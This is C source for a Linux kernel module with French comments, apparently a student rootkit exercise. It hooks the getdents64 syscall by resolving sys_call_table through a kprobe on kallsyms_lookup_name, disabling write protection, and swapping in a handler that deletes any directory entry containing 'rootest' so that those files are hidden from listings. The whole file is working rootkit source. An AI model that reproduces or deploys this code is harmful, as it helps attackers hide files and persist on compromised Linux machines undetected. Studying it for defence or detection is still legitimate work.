#include "rootest.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("2600 student");
MODULE_DESCRIPTION("HOOKING SYSCALL TABLE GETENDS");
MODULE_VERSION("0.01");

/* pour régler de le kallsyms_lookup_name pas défini (désactivé par sécurité) */
struct kprobe kp_kln_ls = {
    .symbol_name = "kallsyms_lookup_name"
};

typedef asmlinkage long (*orig_getdents64_t)(struct pt_regs *);
orig_getdents64_t orig_getdents64;

asmlinkage int hook_getdents64(struct pt_regs *regs)
{
    /* récupérer les paramètres de getdents64 depuis les registres */
    int *fd = (int *)regs->di;
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
    int *count = (int *)regs->dx;
    
    int orig_ls;
    int pos = 0;

    /* appel du getdents64 d'origine */
    orig_ls = orig_getdents64(regs);
    while (pos < orig_ls) {
    	if (strstr(dirp->d_name, "rootest") != NULL) {
      		/* Supprime le fichier de la liste */
		int dir_len = dirp->d_reclen; /* récuperation de la len du dossier avec le pattern */
      		char *next_dir = (char*)dirp + dir_len; /* pointeur sur l'enregistrement après le pattern */
                int len = (int)dirp + orig_ls - (int)next_dir; /*  len la liste après avoir supp le pattern */
      		memmove(dirp, next_dir, len); /* cp de tout le reste de la struc sur l'emplacement actuel */
      		orig_ls -= dir_len; /* Mise à jour de la taille de la liste sans le pattern */
      		continue;
    	}
    	pos += dirp->d_reclen; /* incrementation globale vers le prochain enregistrement de la liste */
    	dirp = (struct linux_dirent64*) ((char*)regs->si + pos); /* inc de la struct contenant les infos dir */
    }
    return orig_ls;
}

int __init rootkit_init_hook_getdents64(void)
{
    /* pour régler de le kallsyms_lookup_name pas défini (déactivé par sécurité) */
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp_kln_ls);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp_kln_ls.addr;
    unregister_kprobe(&kp_kln_ls);
    
    
    __sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

    /* récupération du pointeur sur le vrai syscall */
    orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];

    printk(KERN_INFO "rootkit: syscall table à 0x%lx\n", __sys_call_table);
    printk(KERN_INFO "rootkit: getdents64 syscall à 0x%lx\n", orig_getdents64);
    
    unprotect_memory();

    /* changement du pointeur de sys_write vers le hook */
    __sys_call_table[__NR_getdents64] = (unsigned long)hook_getdents64;

    protect_memory();

    return 0;
}

void __exit rootkit_exit_hook_getdents64(void)
{
    unprotect_memory();
    
    printk(KERN_INFO "rootkit: restauration getdents64 syscall\n");
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    
    protect_memory();
}
